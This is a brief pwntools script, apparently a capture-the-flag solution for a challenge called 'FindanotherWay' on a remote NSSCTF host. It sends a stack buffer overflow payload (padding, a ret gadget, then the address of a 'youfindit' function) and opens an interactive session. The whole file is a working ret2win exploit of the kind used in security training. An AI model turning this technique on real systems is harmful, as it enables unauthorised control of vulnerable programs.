from pwn import *

#io = process("./FindanotherWay")
io = remote("node5.anna.nssctf.cn", 29136)

youfindit = 0x401230
ret = 0x40101a

payload = b"a" * (0xc + 0x8) + p64(ret) + p64(youfindit)
io.sendline(payload)

io.interactive()
